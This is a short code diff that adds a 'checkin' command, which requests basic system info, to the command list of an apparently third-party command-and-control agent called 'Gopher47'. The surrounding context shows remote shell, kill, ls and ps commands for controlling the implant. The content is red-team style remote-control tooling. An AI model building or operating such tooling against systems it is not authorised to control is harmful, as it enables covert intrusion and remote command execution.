@@ -28,6 +28,19 @@ class CommandShell(Command):
         Task.add_data("shell " + arguments['commands'])
         return Task.buffer
 
+class CommandCheckin(Command):
+    Name        = "checkin"
+    Description = "Requests basic system info."
+    Help        = "checkin"
+    NeedAdmin   = False
+    Mitr        = []
+    Params      = []
+
+    def job_generate( self, arguments: dict ) -> bytes:
+        Task = Packer()
+        Task.add_data("checkin")
+        return Task.buffer
+
 class CommandKill(Command):
     Name = "kill"
     Description = "Kills a process off of PID, may fail without sufficient privs. Please only do one PID at a time"
@@ -258,6 +271,7 @@ class Gopher47(AgentType):
 
     Commands = [
         CommandShell(),
+        CommandCheckin(),
         CommandKill(),
         CommandLs(),
         CommandPs(),
